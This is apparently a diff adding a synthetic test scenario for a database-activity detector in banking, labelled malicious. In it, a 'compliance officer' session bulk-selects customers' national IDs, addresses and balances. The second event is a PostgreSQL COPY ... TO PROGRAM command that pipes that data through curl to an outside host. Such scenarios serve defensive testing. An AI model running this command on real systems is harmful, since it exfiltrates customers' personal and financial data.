@@ -1,0 +1,22 @@
+scenario_id: banking_compliance_exfil_0007
+family_id: banking_compliance_exfil_0007
+domain: banking
+time_of_day: '23:30'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: compliance_officer
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.31957311182183906
+  events:
+  - sql: SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id
+  - step_id: exfil
+    sql: COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'
+    connects_to:
+      ip: 10.0.1.50
+      port: 5432
